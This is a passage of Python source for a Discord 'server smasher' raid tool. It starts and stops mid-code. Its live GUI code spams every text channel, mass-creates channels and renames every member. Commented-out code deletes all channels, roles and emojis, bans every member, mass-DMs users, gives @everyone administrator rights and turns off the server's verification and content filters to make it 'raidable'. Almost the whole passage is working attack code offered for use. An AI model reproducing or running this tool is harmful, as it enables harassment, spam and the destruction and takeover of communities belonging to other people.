            sg.PopupNonBlocking("Downloading Data From Discord, Please Wait...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            main_menu()

def server_menu(server_id):
    server = get_guild(server_id)
    server_owner = get_user(server.owner_id)
    tchannels = {}
    vchannels = {}
    tlist = []
    vlist = []
    for channel in server.channels:
        if channel.type == 0:
            tchannels[channel.name] = channel.id
            tlist.append(channel)
        elif channel.type == 2:
            vchannels[channel.name] = channel.id
            vlist.append(channel)
    info = [
           [sg.Text(f"Name: {server.name}\nID: {server.id}\nText Channels: {len(tlist)}\nVoice Channels: {len(vlist)}\nRoles: {len(server.roles)}\nMembers: {len(server.members)}\nRegion: {server.region}\nNitro Boost Level: {server.premium_tier}\nVerification Level: {server.verification_level}\nOwner: {server_owner.username}#{server_owner.discriminator}")]
           ]
    oneclick = [
               [sg.Button("Refresh", size=(13.5,0.8)), sg.Button("Back to server menu", size=(13.5,0.8))],
               [sg.Input("@everyone", size=(17,0.8), key="BlastContent"), sg.Button("Blast", size=(10,0.8))],
               [sg.Input("Channel Name", size=(13.6,0.8), key="ChannelName"),sg.Input("5", size=(3,0.8), key="ChannelCount"), sg.Button("Create Channel", size=(10,0.8))],
               [sg.Text("", size=(0.05,0.8)), sg.Combo(list(tchannels), key="InviteChan", size=(16.6,0.7)), sg.Button("Create Invite", size=(10,0.8))],
               [sg.Input("DeadBread", size=(17,0.8), key="NewNickname"), sg.Button("Mass Nickname", size=(10,0.8))],
               ]
    destructive = [
                  [sg.Button("Scripted Smash", size=(15.3,0.8)), sg.Button("Server Corruptor", size=(15.3,0.8)), sg.Button("Thanos Snap", size=(15.3,0.8))]
                  ]
    layout = [
             [sg.Frame("Server Info", info, font='Any 12', title_color=theme['text_color']), sg.Frame("Actions", oneclick, font='Any 12', title_color=theme['text_color'])],
             [sg.Frame("Destructive Actions", destructive, font='Any 12', title_color=theme['text_color'])]
             ]
    window = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=True, keep_on_top=True).Layout(layout)
    while True:
        event, values = window.Read(timeout=100)
        if event is None:
            sys.exit()
        elif event == "Refresh":
            sg.PopupNonBlocking("Updating cache...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            window.Close()
            server_menu(server_id)
        elif event == "Back to server menu":
            window.Close()
            sg.PopupNonBlocking("Please Wait, Downloading data from Discord.", title="Loading menu", auto_close=True, auto_close_duration=1, keep_on_top=True)
            main_menu()
        elif event == "Blast":
            channels = get_guild_channels(server_id)
            try:
                for channel in channels:
                    if not channel.type == 0:
                        pass
                    else:
                        if values["BlastContent"].lower() == "ascii":
                            content = asciigen(1999)
                        else:
                            content = values["BlastContent"]
                        executor.submit(sendspam, channel.id, content, False)
            except Exception as e:
                sg.PopupNonBlocking(f"Error: {e}")
        elif event == "Create Channel":
            for x in range(int(values['ChannelCount'])):
                executor.submit(createchannel, server.id, values['ChannelName'], 0)
        elif event == "Create Invite":
            invite = create_invite(tchannels[values["InviteChan"]])
            try:
                pyperclip.copy(f"https://discord.gg/{invite.code}")
                sg.Popup(f"https://discord.gg/{invite.code} copied to clipboard.", title="Invite copied to clipboard", non_blocking=True, keep_on_top=True)
            except Exception:
                sg.Popup("Could not create invite.", title="Error", non_blocking=True, keep_on_top=True)
        elif event == "Mass Nickname":
            for member in server.members:
                executor.submit(massnick, server.id, member.user.id, values['NewNickname'])
    # print ("Server: " + colored(server.name,menucolour))
    # print ("Server ID: " + colored(str(SERVER),menucolour))
    # membercount = len(server.members)
    # tchancount = len(server.text_channels)
    # vchancount = len(server.voice_channels)
    # rolecount = len(server.roles)
    # print (colored("{} Members".format(membercount),menucolour))
    # print (colored("{} Roles".format(rolecount),menucolour))
    # print (colored("{} Text Channels, {} Voice Channels".format(tchancount,vchancount),menucolour))
    # print (colored("Nitro Boost Level: {}".format(str(server.premium_tier)),menucolour))
    # print ("----------------------------------------")
    # print ("Options:")
    # print (colored(" 0. More Info\n 1. Configure destruction options. \n 2. Other options \n 3. Create Server Invite. \n 4. Change What the bot is playing. \n 5. Leave server. \n 6. Return to Server Select",menucolour))
    # opts = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Select the number for your option: ")
    #
    # try:
    #     if int(opts) == 0:
    #
    #         print(colored("0: Export Detailed Server Info\n",menucolour))
    #         print(colored("Name: {}".format(str(server.name)),menucolour))
    #         print(colored("Member Count: {}".format(len(server.members)),menucolour))
    #         print(colored("Channel Count: {}".format(len(server.channels)),menucolour))
    #         print(colored("Role Count: {}".format(len(server.roles)),menucolour))
    #         print(colored("Nitro Boost Level: {}".format(str(server.premium_tier)),menucolour))
    #         serverfeat = server.features
    #         if "VIP_REGIONS" in serverfeat:
    #             print(colored("VIP_REGION: True",menucolour))
    #         else:
    #             print(colored("VIP_REGION: False",menucolour))
    #         if "VANITY_URL" in serverfeat:
    #             print(colored("VANITY_URL: True",menucolour))
    #         else:
    #             print(colored("VANITY_URL: False",menucolour))
    #         if "INVITE_SPLASH" in serverfeat:
    #             print(colored("INVITE_SPLASH: True",menucolour))
    #         else:
    #             print(colored("INVITE_SPLASH: False",menucolour))
    #         if "VERIFIED" in serverfeat:
    #             print(colored("VERIFIED: True",menucolour))
    #         else:
    #             print(colored("VERIFIED: False",menucolour))
    #         if "PARTNERED" in serverfeat:
    #             print(colored("PARTNERED: True",menucolour))
    #         else:
    #             print(colored("PARTNERED: False",menucolour))
    #         if "MORE_EMOJI" in serverfeat:
    #             print(colored("MORE_EMOJI: True",menucolour))
    #         else:
    #             print(colored("MORE_EMOJI: False",menucolour))
    #         if "DISCOVERABLE" in serverfeat:
    #             print(colored("DISCOVERABLE: True",menucolour))
    #         else:
    #             print(colored("DISCOVERABLE: False",menucolour))
    #         if "COMMERCE" in serverfeat:
    #             print(colored("COMMERCE: True",menucolour))
    #         else:
    #             print(colored("COMMERCE: False",menucolour))
    #         if "LURKABLE" in serverfeat:
    #             print(colored("LURKABLE: True",menucolour))
    #         else:
    #             print(colored("LURKABLE: False",menucolour))
    #         if "NEWS" in serverfeat:
    #             print(colored("NEWS: True",menucolour))
    #         else:
    #             print(colored("NEWS: False",menucolour))
    #         if "BANNER" in serverfeat:
    #             print(colored("BANNER: True",menucolour))
    #         else:
    #             print(colored("BANNER: False",menucolour))
    #         if "ANIMATED_ICON" in serverfeat:
    #             print(colored("ANIMATED_ICON: True",menucolour))
    #         else:
    #             print(colored("ANIMATED_ICON: False",menucolour))
    #         se = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"\n")
    #         if se == "0":
    #             with open("{} info.txt".format(server.name), "w+", errors='ignore') as handle:
    #                 handle.write("Server Name: {}\n".format(str(server.name)))
    #                 handle.write("Server ID: {}\n".format(str(server.id)))
    #                 handle.write("Server Reigon: {}\n".format(str(server.region)))
    #                 handle.write("Server Icon: {}\n".format(str(server.icon_url)))
    #                 feature = ''
    #                 p = 0
    #                 for f in server.features:
    #                     p += 1
    #                     if p == len(server.features):
    #                         feature += "{}".format(f)
    #                     else:
    #                         feature += "{}, ".format(f)
    #                 handle.write("Server Features: {}\n".format(feature))
    #                 handle.write("Member Count: {}, see member list below.\n".format(len(server.members)))
    #                 handle.write("Channel Count: {}, see channel list below.\n".format(len(server.channels)))
    #                 handle.write("Role Count: {}, see role list below.\n".format(len(server.roles)))
    #                 handle.write("Ammount of users boosting server: {}\n".format(str(server.premium_subscription_count)))
    #                 handle.write("Nitro Boost Level: {}\n".format(str(server.premium_tier)))
    #                 handle.write("\n===============================\nText Channels:\n===============================\n\n")
    #                 for channel in server.text_channels:
    #                     try:
    #                         handle.write("Name: {}\nID: {}\nTopic: {}\nSlowmode Delay: {}\nPosition: {}\nCategory: {}\n\n-----------------------\n\n".format(channel.name,str(channel.id),channel.topic,str(channel.slowmode_delay),str(channel.position),client.get_channel(channel.category_id).name))
    #                     except Exception:
    #                         pass
    #                 handle.write("\n===============================\nVoice Channels:\n===============================\n\n")
    #                 for channel in server.voice_channels:
    #                     try:
    #                         handle.write("Name: {}\nID: {}\nBitrate: {}\nUser limit: {}\nPosition: {}\nCategory: {}\nConnected users:\n\n".format(channel.name,str(channel.id),str(channel.bitrate),str(channel.user_limit),str(channel.position),client.get_channel(channel.category_id).name))
    #                         for u in channel.members:
    #                             handle.write("User: {}#{}\nID: {}\nBot: {}\n".format(u.name,u.discriminator,str(u.id),str(u.bot)))
    #                             handle.write("\n-----------------------\n\n")
    #                     except Exception:
    #                         pass
    #                 handle.write("\n===============================\nRoles:\n===============================\n\n")
    #                 for role in server.roles:
    #                     try:
    #                         handle.write("Name: {}\nID: {}\nColour: {}\nHoisted: {}\nPositon: {}\nMentionable: {}\nPermissions: {}\n\n-----------------------\n\n".format(role.name,str(role.id),str(role.colour.value),str(role.hoist),str(role.position),str(role.mentionable),str(role.permissions)))
    #                     except Exception:
    #                         pass
    #                 handle.write("\n===============================\nUsers:\n===============================\n\n")
    #                 for user in server.members:
    #                     try:
    #                         handle.write("Name: {}#{}\nID: {}\nAvatar: {}\nBot: {}\nDate Joined: {}\nNickname: {}\n\n-----------------------\n\n".format(user.name,str(user.discriminator),str(user.id),str(user.avatar_url),str(user.bot),str(user.joined_at),user.nick))
    #                     except Exception:
    #                         pass
    #             print("Exported to {} info.txt".format(server.name))
    #             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Press enter to return to menu.")
    #         await main(SERVER)
    #
    #     elif int(opts) == 1:
    #         async def changesettings(toggleopts,SERVER):
    #             if sys.platform.startswith('win32'):
    #                 os.system('mode con:cols=70 lines=40')
    #             elif sys.platform.startswith('linux'):
    #                 os.system("printf '\033[8;40;70t'")
    #             try:
    #
    #                 server = client.get_guild(int(SERVER))
    #                 print (colored("Type 'start' to start.",menucolour))
    #                 print (colored("S.  Save Config",menucolour))
    #                 print (colored("L.  Load Config",menucolour))
    #                 print (colored("0.  Go back",menucolour))
    #                 print (colored("1.  Change server name: {}".format(toggleopts['namechange']),menucolour))
    #                 print (colored("2.  New Server Name: {}".format(toggleopts['servname']),menucolour))
    #                 print (colored("3.  Remove server icon: {}".format(toggleopts['iconbegone']),menucolour))
    #                 print (colored("4.  Change server icon: {}".format(toggleopts['changeicon']),menucolour))
    #                 print (colored("5.  Icon Filename: {}".format(toggleopts['iconfile']),menucolour))
    #                 print (colored("6.  Remove Bans: {}".format(toggleopts['rembans']),menucolour))
    #                 print (colored("7.  Delete all channels: {}".format(toggleopts['chandel']),menucolour))
    #                 print (colored("8.  Delete all roles: {}".format(toggleopts['roledel']),menucolour))
    #                 print (colored("9.  Ban all members: {}".format(toggleopts['userban']),menucolour))
    #                 print (colored("10. Ban Reason: {}".format(toggleopts['banreason']),menucolour))
    #                 print (colored("11. Users to not Ban: {}".format(toggleopts['userid']),menucolour))
    #                 print (colored("12. Send DM to everyone: {}".format(toggleopts['senddm']),menucolour))
    #                 print (colored("13. DM Content: {}".format(toggleopts['dmcontent']),menucolour))
    #                 print (colored("14. Create Channels: {}".format(toggleopts['createchan']),menucolour))
    #                 print (colored("15. Channel Creation type: {}".format(toggleopts['chanmethod']),menucolour))
    #                 print (colored("16. Name for the created channels: {}".format(toggleopts['channame']),menucolour))
    #                 print (colored("17. Number of channels to create: {}".format(toggleopts['channelno']),menucolour))
    #                 print (colored("18. Spam after destruction: {}".format(toggleopts['usespam']),menucolour))
    #                 print (colored("19. Spamming method: {}".format(toggleopts['spammethod']),menucolour))
    #                 print (colored("20. Text to spam: {}".format(toggleopts['customtxt']),menucolour))
    #                 print (colored("21. Use text to speech in message: {}".format(toggleopts['usetts']),menucolour))
    #                 print (colored("22. Give yourself admin: {}".format(toggleopts['gimmieadmin']),menucolour))
    #                 print (colored("23. Your ID: {}".format(toggleopts['me']),menucolour))
    #                 print (colored("24. Give @everyone admin: {}".format(toggleopts['giveeveryoneadmin']),menucolour))
    #                 print (colored("25. Create Roles: {}".format(toggleopts['createroles']),menucolour))
    #                 print (colored("26. Number of roles to create: {}".format(toggleopts['crolecount']),menucolour))
    #                 print (colored("27. Role Creation type: {}".format(toggleopts['rolesname']),menucolour))
    #                 print (colored("28. Name of roles: {}".format(toggleopts['custrolename']),menucolour))
    #                 print (colored("29. Delete Emojis: {}".format(toggleopts['deleteemojis']),menucolour))
    #                 print (colored("30. Create Emojis: {}".format(toggleopts['createemojis']),menucolour))
    #                 print (colored("31. Created emoji image path: {}".format(toggleopts['emojipath']),menucolour))
    #                 print (colored("32. Number of created emojis: {}".format(toggleopts['emojinum']),menucolour))
    #                 toga = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Item to toggle or change:\n")
    #                 if toga == 'E':
    #                     while True:
    #                         print(asciigen(10000))
    #                 if toga.lower() == "start":
    #                     for channel in server.channels:
    #                         myperms = channel.permissions_for(server.get_member(client.user.id))
    #                         if myperms.administrator:
    #                             pass
    #                         else:
    #                             print (colored("You do not have admin permissions on this server.","red"))
    #                             con = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"Continue anyway?(Y/N)")
    #                             if con.lower() == 'y':
    #                                 break
    #                             else:
    #                                 await main(SERVER)
    #
    #                     if toggleopts['chandel'] == True:
    #                         print('Deleting channels.')
    #                         for channel in server.channels:
    #                             print (colored("Deleting " + str(channel.name),"blue"))
    #                             pool.add_task(deletechannel,str(channel.id))
    #                         await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #                         print('Finished deleting channels.')
    #
    #                     if toggleopts['roledel'] == True:
    #                        print ('Deleting Roles.')
    #                        for role in server.roles:
    #                             print (colored("Deleting role: " + role.name,"blue"))
    #                             pool.add_task(deleterole,str(role.id),SERVER)
    #                        pool.wait_completion()
    #                        print('Finished deleting roles.')
    #
    #                     if toggleopts['rembans'] == True:
    #                         print ("Removing bans.")
    #                         try:
    #                             bans = await server.bans()
    #                             for ban in bans:
    #                                 print(colored("Removing ban for: {}".format(str(ban.user))))
    #                                 pool.add_task(removeban,str(server.id),str(ban.user.id))
    #                         except Exception as e:
    #                             print (e)
    #
    #                     if toggleopts['deleteemojis'] == True:
    #                         print ("Deleting Emojis.")
    #                         for emoji in server.emojis:
    #                             pool.add_task(removeemoji,server.id,emoji.id)
    #                         await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #
    #                     if toggleopts['senddm'] == True:
    #                         for user in server.members:
    #                             print (colored('Sending DM to ' + user.name,"blue"))
    #                             pool.add_task(senddmtouser,user.id,toggleopts['dmcontent'],toggleopts['usetts'])
    #                         await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #
    #                     if toggleopts['namechange'] == True:
    #                         print('Changing server name...')
    #                         try:
    #                             await server.edit(name=str(toggleopts['servname']))
    #                         except Exception as er:
    #                             print(er)
    #
    #                     if toggleopts['iconbegone'] == True:
    #                         print('Removing icon...')
    #                         try:
    #                             await server.edit(icon=None)
    #                         except Exception as er:
    #                             print(er)
    #
    #                     if toggleopts['changeicon'] == True:
    #                         print('Changing icon...')
    #                         with open(toggleopts['iconfile'], 'rb') as handle:
    #                             icon = handle.read()
    #                             try:
    #                                 await server.edit(icon=icon)
    #                             except Exception as er:
    #                                 print(er)
    #
    #                     if toggleopts['giveeveryoneadmin'] == True:
    #                         print('Giving everyone admin...')
    #                         for role in server.roles:
    #                             if role.name == '@everyone':
    #                                 try:
    #                                     await role.edit(permissions=Permissions.all())
    #                                 except Exception as er:
    #                                     print(er)
    #                                 break
    #
    #                     if toggleopts['userban'] == True:
    #                         print('Banning users...')
    #                         for user in server.members:
    #                             if str(user.name+"#"+user.discriminator) in toggleopts['userid']:
    #                                 print (colored("Not Banning " + str(user.name),"green"))
    #                             else:
    #                                 print (colored('Banning ' + str(user.name),"blue"))
    #                                 pool.add_task(banuser,str(user.id),SERVER)
    #                         await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #
    #                     if toggleopts['gimmieadmin'] == True:
    #                         print('Giving you admin...')
    #                         role = await server.create_role(name="Admin", permissions=Permissions.all())
    #                         user = server.get_member(int(toggleopts['me']))
    #                         await user.add_roles(role)
    #
    #                     if toggleopts['createchan'] == True:
    #                         print('Creating channels.')
    #                         for x in range(int(toggleopts['channelno'])):
    #                             if toggleopts['chanmethod'].lower() == "ascii":
    #                                 pool.add_task(createchannel,SERVER,asciigen(60),"text")
    #                             if toggleopts['chanmethod'].lower() == "set":
    #                                 pool.add_task(createchannel,SERVER,toggleopts['channame'],"text")
    #
    #                             if toggleopts['chanmethod'].lower() == "voice":
    #                                 pool.add_task(createchannel,SERVER,toggleopts['channame'],"voice")
    #                         await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #                         print ('Channels Created.')
    #
    #                     if toggleopts['createroles'] == True:
    #                         print('Creating roles.')
    #                         for x in range(int(toggleopts['crolecount'])):
    #                             if toggleopts['rolesname'] == "set":
    #                                 pool.add_task(createrole,toggleopts['custrolename'],server.id)
    #                             if toggleopts['rolesname'] == "ascii":
    #                                 pool.add_task(createrole,asciigen(60),server.id)
    #                         await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #
    #                     if toggleopts['createemojis'] == True:
    #                         print ("Creating Emojis")
    #                         with open(toggleopts['emojipath'], "rb") as handle:
    #                             encoded = bytes_to_base64_data(handle.read())
    #                         for x in range(int(toggleopts['emojinum'])):
    #                             pool.add_task(addemoji,server.id,encoded,gen())
    #                         await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #
    #                     if toggleopts['chanmethod'].lower() == "voice":
    #                         if toggleopts['chandel'] == True:
    #                             print (colored("Not spamming, due to there only being voice channels in this server.","red"))
    #                             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"")
    #                             await main(SERVER)
    #
    #                     if toggleopts['usespam'] == True:
    #                         print('Spam will start in 5 seconds.')
    #                         if toggleopts['spammethod'] == "asc":
    #                             await ascii_spam(SERVER,toggleopts['usetts'])
    #                         if toggleopts['spammethod'] == "massment":
    #                             await mass_tag(SERVER,toggleopts['usetts'])
    #                         if toggleopts['spammethod'] == "text":
    #                             await text_spam(SERVER,toggleopts['customtxt'],toggleopts['usetts'])
    #                         if toggleopts['spammethod'] == "everyone":
    #                             await everyonespam(SERVER,toggleopts['usetts'])
    #                     else:
    #                         print ("Finished!")
    #                         await loop.run_in_executor(ThreadPoolExecutor(), inputselection,"")
    #                         await main(SERVER)
    #                 if toga.lower() == 's':
    #                     presetname = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name Of Preset: ')
    #                     if not os.path.exists("RTBFiles/presets/"):
    #                         os.mkdir("RTBFiles/presets/")
    #                     with open ("RTBFiles/presets/{}.smpreset".format(presetname),"w+", errors='ignore') as handle:
    #                         handle.write(str(toggleopts))
    #                     await changesettings(toggleopts,SERVER)
    #                 if toga.lower() == 'l':
    #
    #                     presets = []
    #                     for file in os.listdir("RTBFiles/presets/"):
    #                         if file.endswith(".smpreset"):
    #                             presets.append(file)
    #                     precount = -1
    #                     for pre in presets:
    #                         precount += 1
    #                         print(colored("{}. {}".format(precount,pre),menucolour))
    #                     prechoice = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Preset To load: ')
    #                     with open("RTBFiles/presets/{}".format(presets[int(prechoice)]), "r", errors="ignore") as handle:
    #                         content = handle.read().splitlines()
    #                         toggleopts = ast.literal_eval(content[0])
    #                         print("Loaded Config File")
    #                     await changesettings(toggleopts,SERVER)
    #                 if int(toga) == 0:
    #                     await main(SERVER)
    #                 elif int(toga) == 1:
    #                     if toggleopts['namechange'] == True:
    #                         toggleopts['namechange'] = False
    #                     else:
    #                         toggleopts['namechange'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 2:
    #                     toggleopts['servname'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'New Server name: ')
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 3:
    #                     if toggleopts['iconbegone'] == True:
    #                         toggleopts['iconbegone'] = False
    #                     else:
    #                         toggleopts['iconbegone'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 4:
    #                     if toggleopts['changeicon'] == True:
    #                         toggleopts['changeicon'] = False
    #                     else:
    #                         toggleopts['changeicon'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 5:
    #                     if noguimode == 1:
    #                         toggleopts['iconfile'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'New Server icon: ')
    #                     else:
    #                         toggleopts['iconfile'] = askopenfilename(initialdir = os.getcwd(),title = "Select server icon")
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 6:
    #                     if toggleopts['rembans'] == True:
    #                         toggleopts['rembans'] = False
    #                     else:
    #                         toggleopts['rembans'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 7:
    #                     if toggleopts['chandel'] == True:
    #                         toggleopts['chandel'] = False
    #                     else:
    #                         toggleopts['chandel'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 8:
    #                     if toggleopts['roledel'] == True:
    #                         toggleopts['roledel'] = False
    #                     else:
    #                         toggleopts['roledel'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 9:
    #                     if toggleopts['userban'] == True:
    #                         toggleopts['userban'] = False
    #                     else:
    #                         toggleopts['userban'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 10:
    #                     toggleopts['banreason'] = input ("Ban Reason: ")
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 11:
    #                     appen = input ("Username and Descriminator: ")
    #                     if appen == '':
    #                         await changesettings(toggleopts,SERVER)
    #                     else:
    #                         toggleopts['userid'].append(appen)
    #                         await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 12:
    #                     if toggleopts['senddm'] == True:
    #                         toggleopts['senddm'] = False
    #                     else:
    #                         toggleopts['senddm'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 13:
    #                     toggleopts['dmcontent']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'DM Content: ')
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 14:
    #                     if toggleopts['createchan'] == True:
    #                         toggleopts['createchan'] = False
    #                     else:
    #                         toggleopts['createchan'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 15:
    #                     if toggleopts['chanmethod'] == "set":
    #                         toggleopts['chanmethod'] = "ascii"
    #                     elif toggleopts['chanmethod'] == "ascii":
    #                         toggleopts['chanmethod'] = "voice"
    #                     elif toggleopts['chanmethod'] == "voice":
    #                         toggleopts['chanmethod'] = "set"
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 16:
    #                     toggleopts['channame']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name of created channels: ')
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 17:
    #                     toggleopts['channelno'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Number of Channels to create: ')
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 18:
    #                     if toggleopts['usespam'] == True:
    #                         toggleopts['usespam'] = False
    #                     else:
    #                         toggleopts['usespam'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 19:
    #                     if toggleopts['spammethod'] == "text":
    #                         toggleopts['spammethod'] = "asc"
    #                     elif toggleopts['spammethod'] == "asc":
    #                         toggleopts['spammethod'] = "everyone"
    #                     elif toggleopts['spammethod'] == "everyone":
    #                         toggleopts['spammethod'] = "massment"
    #                     elif toggleopts['spammethod'] == "massment":
    #                         toggleopts['spammethod'] = "text"
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 20:
    #                     toggleopts['customtxt'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Text to spam: ')
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 21:
    #                     if toggleopts['usetts'] == 'true':
    #                         toggleopts['usetts'] = 'false'
    #                     else:
    #                         toggleopts['usetts'] = 'true'
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 22:
    #                     if toggleopts['gimmieadmin'] == True:
    #                         toggleopts['gimmieadmin'] = False
    #                     else:
    #                         toggleopts['gimmieadmin'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 23:
    #                     toggleopts['me']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Your ID for giving admin: ')
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 24:
    #                     if toggleopts['giveeveryoneadmin'] == True:
    #                         toggleopts['giveeveryoneadmin'] = False
    #                     else:
    #                         toggleopts['giveeveryoneadmin'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 25:
    #                     if toggleopts['createroles'] == True:
    #                         toggleopts['createroles'] = False
    #                     else:
    #                         toggleopts['createroles'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 26:
    #                     toggleopts['crolecount'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Number of Roles to create: ')
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 27:
    #                     if toggleopts['rolesname'] == 'set':
    #                         toggleopts['rolesname'] = 'ascii'
    #                     else:
    #                         toggleopts['rolesname'] = 'set'
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 28:
    #                     toggleopts['custrolename'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Name of created roles: ')
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 29:
    #                     if toggleopts['deleteemojis'] == True:
    #                         toggleopts['deleteemojis'] = False
    #                     else:
    #                         toggleopts['deleteemojis'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 30:
    #                     if toggleopts['createemojis'] == True:
    #                         toggleopts['createemojis'] = False
    #                     else:
    #                         toggleopts['createemojis'] = True
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 31:
    #                     if noguimode == 1:
    #                         toggleopts['iconfile'] = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Emoji path: ')
    #                     else:
    #                         toggleopts['emojipath'] = askopenfilename(initialdir = os.getcwd(),title = "Select emoji")
    #                     await changesettings(toggleopts,SERVER)
    #                 elif int(toga) == 32:
    #                     toggleopts['emojinum']  = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Number of created emojis: ')
    #                     await changesettings(toggleopts,SERVER)
    #                 else:
    #                     print ("Invalid option")
    #                     await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #                     await changesettings(toggleopts,SERVER)
    #             except Exception as e:
    #                 print (e)
    #                 await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'')
    #                 await changesettings(toggleopts,SERVER)
    #         await changesettings(toggleopts,SERVER)
    #
    #     elif int(opts) == 2:
    #         print(colored("Other options",menucolour))
    #         print(colored("0.   Back",menucolour))
    #         print(colored("1.   Move People in VC",menucolour))
    #         print(colored("2.   Mass Nickname Change",menucolour))
    #         print(colored("3.   Make server Raidable and insecure",menucolour))
    #         print(colored("4.   Check Bot Permissions",menucolour))
    #         print(colored("5.   Channel Webhook Smasher",menucolour))
    #         print(colored("6.   Server Corruptor (Destructive)",menucolour))
    #         print(colored("7.   Music Player",menucolour))
    #         print(colored("8.   Make all channels NSFW",menucolour))
    #         print(colored("9.   Change All channels topic",menucolour))
    #         print(colored("10.  Thanos Snap (Destructive)",menucolour))
    #         sel = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Selection: ')
    #         if int(sel) == 0:
    #             await main(SERVER)
    #         elif int(sel) == 1:
    #
    #             print("Moving members in voice channels.")
    #             while not client.is_closed():
    #                 channellist = []
    #                 memberlist = []
    #                 for channel in server.voice_channels:
    #                     channellist.append(channel)
    #                 for channel in channellist:
    #                     for member in channel.members:
    #                         memberlist.append(member)
    #                 for member in memberlist:
    #                     try:
    #                         channel = random.choice(channellist)
    #                         channel = channel
    #                         pool.add_task(mover,server.id,member.id,channel.id)
    #                         await asyncio.sleep(0.1)
    #                     except Exception:
    #                         pass
    #                 await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #         elif int(sel) == 2:
    #
    #             newnick = await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'New Nickname: ')
    #             print(colored("Changing Nicknames, Please wait...",menucolour))
    #             for member in server.members:
    #                 pool.add_task(massnick,server.id,member.id,newnick)
    #             await loop.run_in_executor(ThreadPoolExecutor(), complete_pool)
    #             print(colored("Finished Changing nicknames.",menucolour))
    #             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
    #             await main(SERVER)
    #         elif int(sel) == 3:
    #
    #             print(colored("Modifying server rules, Please wait...",menucolour))
    #             if client_type == 'bot':
    #                 headers={ 'Authorization': 'Bot '+token,'Content-Type': 'application/json'}
    #             else:
    #                 headers={ 'Authorization': token,'Content-Type': 'application/json'}
    #             payload = {'default_message_notifications': 0,'explicit_content_filter': 0,'verification_level': 0}
    #             requests.patch('https://discordapp.com/api/v6/guilds/'+str(server.id),headers=headers,json=payload)
    #             (colored("Rules modified.",menucolour))
    #             await loop.run_in_executor(ThreadPoolExecutor(), inputselection,'Press Enter to return to menu.\n')
    #             await main(SERVER)
    #         elif int(sel) == 4:
    #
    #             for channel in server.channels:
    #                 myperms = channel.permissions_for(server.get_member(client.user.id))
    #                 print("Bot Has the following permissions:")
    #                 if myperms.administrator:
    #                     print("Administrator")
    #                     break
    #                 if myperms.ban_members:
    #                     print("Ban Members")
    #                 if myperms.manage_roles:
    #                     print("Manage Roles")
    #                 if myperms.manage_channels:
    #                     print("Manage Channels")
    #                 if myperms.manage_channels:
    #                     print("Manage Guild")
    #                 if myperms.mention_everyone:
    #                     print("Mention Everyone")
    #                 if myperms.manage_nicknames:
